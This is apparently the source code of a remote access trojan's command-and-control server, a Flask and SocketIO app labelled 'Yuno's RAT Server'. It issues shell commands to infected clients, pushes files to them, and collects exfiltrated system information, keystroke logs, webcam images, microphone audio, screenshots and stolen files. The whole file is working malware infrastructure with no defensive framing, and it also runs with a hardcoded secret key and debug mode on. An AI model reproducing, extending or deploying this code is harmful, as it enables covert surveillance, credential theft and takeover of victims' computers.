#!/usr/bin/env python3
import os
import json
import datetime
from flask import Flask, render_template, request, send_from_directory, jsonify
from flask_socketio import SocketIO, emit
from werkzeug.utils import secure_filename
import base64
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['DOWNLOAD_FOLDER'] = 'downloads'
socketio = SocketIO(app, cors_allowed_origins="*")

# Ensure directories exist
for folder in [app.config['UPLOAD_FOLDER'], app.config['DOWNLOAD_FOLDER']]:
    if not os.path.exists(folder):
        os.makedirs(folder)

# Track connected clients
connected_clients = set()

# Store client info and activity
client_info = {}
client_activity = {}

def get_files():
    """List all files in the upload folder."""
    upload_folder = app.config['UPLOAD_FOLDER']
    files = [f for f in os.listdir(upload_folder) if os.path.isfile(os.path.join(upload_folder, f))]
    return sorted(files)

@app.route('/')
def index():
    """Render the main page with connected clients and uploaded files."""
    files = get_files()
    return render_template('index.html', clients=list(connected_clients), files=files)

@app.route('/send_command', methods=['POST'])
def send_command():
    """Handle command submission from the web interface."""
    client_id = request.form.get('client_id')
    command = request.form.get('command')

    if not client_id or not command:
        return jsonify({"status": "error", "message": "Missing client_id or command"}), 400

    print(f"[*] Sending command '{command}' to {client_id}")
    socketio.emit('command', command, to=client_id)
    return jsonify({"status": "success", "message": f"Command '{command}' sent to {client_id}"})

@app.route('/upload', methods=['POST'])
def upload_file():
    """Handle file upload from web interface to send to client."""
    if 'file' not in request.files:
        return jsonify({"status": "error", "message": "No file part"}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({"status": "error", "message": "No selected file"}), 400
    if file:
        filename = secure_filename(file.filename)
        file_data = file.read()
        file_base64 = base64.b64encode(file_data).decode('utf-8')
        socketio.emit('upload_file', {
            "filename": filename,
            "data": file_base64
        }, broadcast=True)
        return jsonify({"status": "success", "message": f"File '{filename}' sent to clients"})

@app.route('/download/<filename>')
def download(filename):
    """Serve files for clients to download."""
    return send_from_directory(app.config['DOWNLOAD_FOLDER'], filename)

@app.route('/view_file/<filename>')
def view_file(filename):
    """Render a page to view the contents of an uploaded file."""
    filename = secure_filename(filename)
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read()
        return render_template('view_file.html', filename=filename, file_content=content)
    else:
        return "File not found", 404

@socketio.on('connect')
def handle_connect():
    """Handle new client connections."""
    client_id = request.sid
    connected_clients.add(client_id)
    client_activity[client_id] = {"last_active": time.time(), "status": "active"}
    print(f"[*] Client connected: {client_id}")
    emit('client_update', list(connected_clients), broadcast=True)

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnections."""
    client_id = request.sid
    if client_id in connected_clients:
        connected_clients.remove(client_id)
        client_info.pop(client_id, None)
        client_activity.pop(client_id, None)
        print(f"[*] Client disconnected: {client_id}")
        emit('client_update', list(connected_clients), broadcast=True)

@socketio.on('exfil_data')
def handle_exfil_data(data):
    """Handle exfiltrated data from clients."""
    client_id = request.sid
    data = json.loads(data)
    data_type = data.get('type')

    # Update activity status
    client_activity[client_id]["last_active"] = time.time()
    current_time = time.time()
    for cid, activity in client_activity.items():
        if current_time - activity["last_active"] > 30:  # Idle after 30 seconds
            activity["status"] = "idle"
        else:
            activity["status"] = "active"

    if data_type == "system_info":
        username = data.get('system', {}).get('username', None)
        if not username:
            socketio.emit('command', 'whoami', to=client_id)
        else:
            client_info[client_id] = data.get('system', {})
            client_info[client_id]['username'] = username
            client_info[client_id]['ip_addresses'] = data.get('network', {}).get('ip_addresses', [])
            client_info[client_id]['location'] = data.get('network', {}).get('location', 'Unknown')
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{client_id}_{timestamp}_sysinfo.json"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)
        print(f"[*] Exfiltrated data saved: {filepath}")

    elif data_type == "command_output":
        command = data.get('command', 'unknown')
        output = data.get('output', '')
        current_dir = data.get('current_dir', 'unknown')
        if command.strip().lower() == 'whoami':
            username = output.strip()
            if client_id not in client_info:
                client_info[client_id] = {}
            client_info[client_id]['username'] = username
        emit('command_output', {
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'client_id': client_id,
            'command': command,
            'output': output,
            'current_dir': current_dir
        }, broadcast=True)

    elif data_type == "network_data":
        emit('network_data', {
            'client_id': client_id,
            'timestamp': data.get('timestamp'),
            'bytes_sent': data.get('bytes_sent'),
            'bytes_recv': data.get('bytes_recv'),
            'sent_speed_mbps': data.get('sent_speed_mbps'),
            'recv_speed_mbps': data.get('recv_speed_mbps')
        }, broadcast=True)

    elif data_type == "system_data":
        emit('system_data', {
            'client_id': client_id,
            'timestamp': data.get('timestamp'),
            'cpu_usage_percent': data.get('cpu_usage_percent'),
            'memory_usage_mb': data.get('memory_usage_mb')
        }, broadcast=True)

    elif data_type == "webcam_data":
        emit('webcam_data', {
            'client_id': client_id,
            'image': data.get('image')
        }, broadcast=True)

    elif data_type == "mic_data":
        emit('mic_data', {
            'client_id': client_id,
            'audio': data.get('audio')
        }, broadcast=True)

    elif data_type == "screenshot_data":
        emit('screenshot_data', {
            'client_id': client_id,
            'image': data.get('image')
        }, broadcast=True)

    elif data_type == "keylog_data":
        emit('keylog_data', {
            'client_id': client_id,
            'logs': data.get('logs')
        }, broadcast=True)

    elif data_type == "file_download":
        filename = data.get('filename')
        file_data = base64.b64decode(data.get('data'))
        filepath = os.path.join(app.config['DOWNLOAD_FOLDER'], filename)
        with open(filepath, 'wb') as f:
            f.write(file_data)
        print(f"[*] Received file {filename} from client {client_id}")

    # Emit updated client info
    client_info_list = [{'id': cid, 'system': info, 'activity': client_activity.get(cid, {'status': 'idle'})} for cid, info in client_info.items()]
    emit('client_info', client_info_list, broadcast=True)

@socketio.on('request_client_info')
def handle_request_client_info():
    """Handle requests for client info from the web interface."""
    client_info_list = [{'id': cid, 'system': info, 'activity': client_activity.get(cid, {'status': 'idle'})} for cid, info in client_info.items()]
    emit('client_info', client_info_list)

if __name__ == "__main__":
    print("=== Yuno's RAT Server ===")
    print("A remote access server by Yuno\n")
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)